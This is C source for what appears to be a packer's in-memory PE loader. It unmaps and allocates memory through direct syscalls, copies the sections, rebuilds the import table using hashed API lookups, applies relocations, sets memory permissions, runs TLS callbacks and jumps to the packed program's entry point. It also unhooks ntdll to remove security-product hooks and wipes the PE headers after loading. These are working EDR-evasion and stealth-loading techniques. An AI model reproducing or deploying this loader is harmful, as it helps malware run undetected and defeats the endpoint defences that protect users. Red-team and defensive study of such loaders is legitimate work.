#include <Windows.h>


#include "Debug.h"
#include "Structs.h"
#include "Utils.h"
#include "Syscalls.h"


typedef struct _InPeConfig {

	ULONG_PTR				pPeAddress;
	SIZE_T					sPeSize;

	PIMAGE_DOS_HEADER		pDosHdr;
	PIMAGE_NT_HEADERS		pNtHdr;


	PIMAGE_DATA_DIRECTORY	pEIDataDir;		//IMAGE_DIRECTORY_ENTRY_IMPORT
	PIMAGE_DATA_DIRECTORY	pTLSDataDir;	//IMAGE_DIRECTORY_ENTRY_TLS
	PIMAGE_DATA_DIRECTORY	pEBDataDir;		//IMAGE_DIRECTORY_ENTRY_BASERELOC
	PIMAGE_DATA_DIRECTORY	pEHDataDir;		//IMAGE_DIRECTORY_ENTRY_EXCEPTION

	PIMAGE_SECTION_HEADER	pSecHdr;

} InPeConfig, * PInPeConfig;





BOOL _InitPeStruct(PInPeConfig _Pe, PVOID pPeAddress, SIZE_T sPeSize) {

	// check input
	if (pPeAddress == NULL || sPeSize == NULL) {
		return FALSE;
	}

	// filling up the struct
	_Pe->pPeAddress = pPeAddress;
	_Pe->sPeSize = sPeSize;

	// filling up the struct with the headers

	
	_Pe->pDosHdr = (PIMAGE_DOS_HEADER)pPeAddress;
	// dos hdr check
	if (_Pe->pDosHdr->e_magic != IMAGE_DOS_SIGNATURE) {
		return FALSE;
	}
	
	_Pe->pNtHdr = (PIMAGE_NT_HEADERS)((PBYTE)pPeAddress + _Pe->pDosHdr->e_lfanew);
	// nt hdr check
	if (_Pe->pNtHdr->Signature != IMAGE_NT_SIGNATURE) {
		return FALSE;
	}
	
	// sections 
	_Pe->pEIDataDir = &_Pe->pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

	_Pe->pTLSDataDir = &_Pe->pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
	
	_Pe->pEBDataDir = &_Pe->pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

	_Pe->pEHDataDir = &_Pe->pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];

	_Pe->pSecHdr = (PIMAGE_SECTION_HEADER)((SIZE_T)_Pe->pNtHdr + sizeof(IMAGE_NT_HEADERS));
	
	//check
	if (_Pe->pDosHdr == NULL	|| _Pe->pNtHdr == NULL		||
		_Pe->pEIDataDir == NULL || _Pe->pTLSDataDir == NULL || _Pe->pEBDataDir == NULL || _Pe->pEHDataDir  == NULL ||
		_Pe->pSecHdr == NULL	
		){
		
		return FALSE;
	}
	//done
	return TRUE;
}




BOOL _FixImportAddressTable(InPeConfig _Pe, ULONG_PTR pPeAddress) {

	PIMAGE_IMPORT_DESCRIPTOR	pImgDes = NULL;

	/*
	// this work as well, in case u want to ignore the 'InPeConfig' parameter:
	PIMAGE_DOS_HEADER			pDosHdr = (PIMAGE_DOS_HEADER)pPeAddress;
	PIMAGE_NT_HEADERS			pNtHdr = (PIMAGE_NT_HEADERS)(pPeAddress + pDosHdr->e_lfanew);
	PIMAGE_DATA_DIRECTORY		pEIDataDir = &pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];;
	*/

	// loop through the dlls
	for (SIZE_T i = 0; i < _Pe.pEIDataDir->Size; i += sizeof(IMAGE_IMPORT_DESCRIPTOR)) {

		pImgDes = (IMAGE_IMPORT_DESCRIPTOR*)(_Pe.pEIDataDir->VirtualAddress + (ULONG_PTR)pPeAddress + i);

		if (pImgDes->OriginalFirstThunk == NULL && pImgDes->FirstThunk == NULL) {
			break;
		}

		LPSTR		DllName		= (LPSTR)((ULONGLONG)pPeAddress + pImgDes->Name);
		ULONG_PTR	Head		= pImgDes->FirstThunk;
		ULONG_PTR	Next		= pImgDes->OriginalFirstThunk;
		SIZE_T		HeadSize	= 0;
		SIZE_T		NextSize	= 0;
		HMODULE		hModule		= LoadLibraryH(DllName);

		if (hModule == NULL) {
			return FALSE;
		}

		if (Next == NULL) {
			Next = pImgDes->FirstThunk;
		}
		
		// loop through functions inside the dll to import
		while (TRUE) {

			PIMAGE_THUNK_DATA			_1stThunk				= (IMAGE_THUNK_DATA*)(pPeAddress + HeadSize + Head);
			PIMAGE_THUNK_DATA			Orig1stThunk			= (IMAGE_THUNK_DATA*)(pPeAddress + NextSize + Next);
			PIMAGE_IMPORT_BY_NAME		FuncName				= NULL;
			ULONG_PTR					pFunction				= NULL;

			if (_1stThunk->u1.Function == NULL) {
				break;
			}

			// by ordinal
			if (Orig1stThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
				PIMAGE_DOS_HEADER		_dos;
				PIMAGE_NT_HEADERS		_nt;
				PIMAGE_EXPORT_DIRECTORY	_ExportDir;
				PDWORD					_FuncAddArray;
				
				_dos = (PIMAGE_DOS_HEADER)hModule;
				_nt = (PIMAGE_NT_HEADERS)(((ULONG_PTR)hModule) + _dos->e_lfanew);
				_ExportDir = (PIMAGE_EXPORT_DIRECTORY)(((ULONG_PTR)hModule) + _nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
				_FuncAddArray = (PDWORD)((ULONG_PTR)hModule + _ExportDir->AddressOfFunctions);
				
				pFunction = ((ULONG_PTR)hModule + _FuncAddArray[Orig1stThunk->u1.Ordinal]);

				//this work as well:
				//pFunction = (ULONG_PTR)GetProcAddress(hModule, (char*)(Orig1stThunk->u1.Ordinal & 0xFFFF));
			}
			// by name
			else {
				FuncName = (PIMAGE_IMPORT_BY_NAME)((SIZE_T)pPeAddress + Orig1stThunk->u1.AddressOfData);
				pFunction = (ULONG_PTR)GetProcAddressH(hModule, HASH(FuncName->Name));
				//this work as well:
				//pFunction = (ULONG_PTR)GetProcAddress(hModule, FuncName->Name);

			}

			if (pFunction == NULL) {
#ifdef DEBUG
				PRINTA("[!] Could Not Import !%s.%s \n", DllName, FuncName->Name);
#endif // DEBUG
				return FALSE;
			}

			_1stThunk->u1.Function = (ULONGLONG)pFunction;

			// next function
			HeadSize += sizeof(IMAGE_THUNK_DATA);
			NextSize += sizeof(IMAGE_THUNK_DATA);
			
		}
	}
	
	return TRUE;
}


// from https://github.com/Cracked5pider/KaynLdr/blob/main/KaynLdr/src/Win32.c#L139 && https://github.com/abhisek/Pe-Loader-Sample/blob/master/src/PeLdr.cpp#L18

BOOL _ReallocationSupport(ULONG_PTR ActualAddress, ULONG_PTR PreferableAddress, PIMAGE_BASE_RELOCATION BaseRelocDir){

	PIMAGE_BASE_RELOCATION  pImageBR = BaseRelocDir;
	ULONG_PTR				OffsetIB = ActualAddress - PreferableAddress;
	PBASE_RELOCATION_ENTRY	Reloc	 = NULL;

	while (pImageBR->VirtualAddress != 0){

		Reloc = (PBASE_RELOCATION_ENTRY)(pImageBR + 1);

		while ((PBYTE)Reloc != (PBYTE)pImageBR + pImageBR->SizeOfBlock){
			
			switch (Reloc->Type) {
				case IMAGE_REL_BASED_DIR64:
					*((ULONG_PTR*)(ActualAddress + pImageBR->VirtualAddress + Reloc->Offset)) += OffsetIB;
					break;
				case IMAGE_REL_BASED_HIGHLOW:
					*((DWORD*)(ActualAddress + pImageBR->VirtualAddress + Reloc->Offset)) += (DWORD)OffsetIB;
					break;

				case IMAGE_REL_BASED_HIGH:
					*((WORD*)(ActualAddress + pImageBR->VirtualAddress + Reloc->Offset)) += HIWORD(OffsetIB);
					break;

				case IMAGE_REL_BASED_LOW:
					*((WORD*)(ActualAddress + pImageBR->VirtualAddress + Reloc->Offset)) += LOWORD(OffsetIB);
					break;

				case IMAGE_REL_BASED_ABSOLUTE:
					break;

				default:
#ifdef DEBUG
					PRINT(L"[!] Unknown relocation type: 0x%08x \n", Reloc->Offset);
#endif // DEBUG
					return FALSE;
			}

			Reloc++;
		}

		pImageBR = (PIMAGE_BASE_RELOCATION)Reloc;
	}

	return TRUE;
}



VOID UnpackAndRunEp(PVOID pPeAddress, SIZE_T sPeSize, BOOL RunPe) {
	
	InPeConfig				_Pe1		= { 0 };
	ULONG_PTR				pAddress	= NULL;


	if (!_InitPeStruct(&_Pe1, pPeAddress, sPeSize)) {
#ifdef DEBUG
		PRINT(L"[!] Could Not Initialize The Pe Struct (Unpack.c:234)\n");
#endif // DEBUG
		return;
	}

	NtUnmapViewOfSection(NULL, _Pe1.pNtHdr->OptionalHeader.ImageBase, NULL);
	
	
	pAddress = (ULONG_PTR)NtAllocateVirtualMemory(NULL, _Pe1.pNtHdr->OptionalHeader.ImageBase, _Pe1.pNtHdr->OptionalHeader.SizeOfImage, NULL, NULL, NULL);
	if (pAddress == NULL) {
		pAddress = (ULONG_PTR)NtAllocateVirtualMemory2(_Pe1.pNtHdr->OptionalHeader.SizeOfImage, NULL);
		if (pAddress == NULL) {
#ifdef DEBUG
			PRINT(L"[!] Failed To Allocate A Vaild Base Address For The Pe (Unpack.c:244)\n");
#endif // DEBUG
			return;
		}
	}

#ifdef DEBUG
	PRINT(L"[i] Preferable Address : 0x%p \n", _Pe1.pNtHdr->OptionalHeader.ImageBase);
	PRINT(L"[i] Actuall Allocated Address : 0x%p \n", pAddress);
	PRINT(L"[i] Allocation Size : %d \n", (unsigned int)_Pe1.pNtHdr->OptionalHeader.SizeOfImage);
#endif // DEBUG

	_memcpy(pAddress, pPeAddress, _Pe1.pNtHdr->OptionalHeader.SizeOfHeaders);


	for (int i = 0; i < _Pe1.pNtHdr->FileHeader.NumberOfSections; i++) {
#ifdef DEBUG
		PRINT(L"\t[%0.2d] Copying 0x%p To 0x%p Of Size : %d \n", i, (ULONG_PTR)pPeAddress + _Pe1.pSecHdr[i].VirtualAddress, pAddress + _Pe1.pSecHdr[i].PointerToRawData, _Pe1.pSecHdr[i].SizeOfRawData);
#endif // DEBUG

		_memcpy(pAddress + _Pe1.pSecHdr[i].VirtualAddress, (ULONG_PTR)pPeAddress + _Pe1.pSecHdr[i].PointerToRawData, _Pe1.pSecHdr[i].SizeOfRawData);
	}

	// fixing the iat
	if (!_FixImportAddressTable(_Pe1, pAddress)) {
#ifdef DEBUG
		PRINT(L"[!] Failed To Fix The IAT (Unpack.c:273)\n");
#endif // DEBUG
		return;
	}

	// reallocation if needed
	if (pAddress != _Pe1.pNtHdr->OptionalHeader.ImageBase) {
#ifdef DEBUG
		PRINT(L"[i] The Allocated Mem Is Different Than The Preferable Address, Handling Reallocations ... \n");
#endif // DEBUG
		if (!_ReallocationSupport(pAddress, _Pe1.pNtHdr->OptionalHeader.ImageBase, (PIMAGE_BASE_RELOCATION)(pAddress + _Pe1.pEBDataDir->VirtualAddress))) {
#ifdef DEBUG
			PRINT(L"[!] Failed To Fix The Re-Allocation (Unpack.c:285)\n");
#endif // DEBUG
			return;
		}
		
	}

	// registering exception handlers if needed
	if (_Pe1.pEHDataDir->Size){
#ifdef DEBUG
		PRINT(L"[i] Handling The Packed Pe's Exception Handlers ... \n");
#endif // DEBUG
		PIMAGE_RUNTIME_FUNCTION_ENTRY pImgRunFuncEntry = (PIMAGE_RUNTIME_FUNCTION_ENTRY)(pAddress + _Pe1.pEHDataDir->VirtualAddress);

		fnRtlAddFunctionTable pRtlAddFunctionTable = (fnRtlAddFunctionTable)GetProcAddressH(GetModuleHandleH(KERNEL32DLL), RtlAddFunctionTable_StrHashed);
		if (pRtlAddFunctionTable == NULL || (pRtlAddFunctionTable != NULL && !pRtlAddFunctionTable(pImgRunFuncEntry, (_Pe1.pEHDataDir->Size / sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY)) - 1, pAddress))) {
#ifdef DEBUG
			PRINT(L"[!] RtlAddFunctionTable Failed (Unpack.c:302) [ %d ]\n", GetLastError());
#endif // DEBUG
		return;	// altho its prob okk in case of this failed
		}
	}


	if (!RefreshNtdll()) {
#ifdef DEBUG
			PRINT(L"[!] Failed To Refresh Ntdll's Text Section From Hooks [ Unpack.c:311 ]\n");
#endif // DEBUG
		 return;	// altho its prob okk in case of this failed
	}
	

	// fixing the permissions (needed before the tls callbacks handling)
	for (DWORD i = 0; i < _Pe1.pNtHdr->FileHeader.NumberOfSections; i++) {

		DWORD Protection = 0;

		if (_Pe1.pSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE)
			Protection = PAGE_WRITECOPY;

		if (_Pe1.pSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ)
			Protection = PAGE_READONLY;

		if ((_Pe1.pSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (_Pe1.pSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ))
			Protection = PAGE_READWRITE;

		if (_Pe1.pSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
			Protection = PAGE_EXECUTE;

		if ((_Pe1.pSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (_Pe1.pSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE))
			Protection = PAGE_EXECUTE_WRITECOPY;

		if ((_Pe1.pSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (_Pe1.pSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ))
			Protection = PAGE_EXECUTE_READ;

		if ((_Pe1.pSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (_Pe1.pSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (_Pe1.pSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ))
			Protection = PAGE_EXECUTE_READWRITE;
		
#ifdef DEBUG
		PRINT(L"\t[%0.2d] Setting Mem Permissions To 0x%0.4X on [ 0x%p ]\n", i, Protection, (PVOID)(pAddress + _Pe1.pSecHdr[i].VirtualAddress));
#endif // DEBUG

		NtProtectVirtualMemory(NULL, (PVOID)(pAddress + _Pe1.pSecHdr[i].VirtualAddress), (SIZE_T)(_Pe1.pSecHdr[i].SizeOfRawData), Protection, NULL);
	}


	// tls callback handling if needed
	if (_Pe1.pTLSDataDir->Size) {
#ifdef DEBUG
		PRINT(L"[i] Found Tls Callbacks, Setting Up For Execution ... \n");
#endif // DEBUG

		PIMAGE_TLS_DIRECTORY pImgTlsDir = (PIMAGE_TLS_DIRECTORY)(pAddress + _Pe1.pTLSDataDir->VirtualAddress);
		PIMAGE_TLS_CALLBACK* ppCallback = (PIMAGE_TLS_CALLBACK*)(pImgTlsDir->AddressOfCallBacks);
		for (; *ppCallback; ppCallback++) {
			(*ppCallback)((LPVOID)pAddress, DLL_PROCESS_ATTACH, NULL);
		}
	}


	PVOID EP = (PVOID)(pAddress + _Pe1.pNtHdr->OptionalHeader.AddressOfEntryPoint);

	// clean everything before .txt section ( ~ 4096 bytes )
	_ZeroMemory(pAddress, (SIZE_T)_Pe1.pSecHdr[0].VirtualAddress);

#ifdef DEBUG
	PRINT(L"[i] Running The Packed Pe's Entry Point ... \n\n\n");
#endif // DEBUG
	
	// you can do it with other ways
	((VOID(*)())EP)();
}


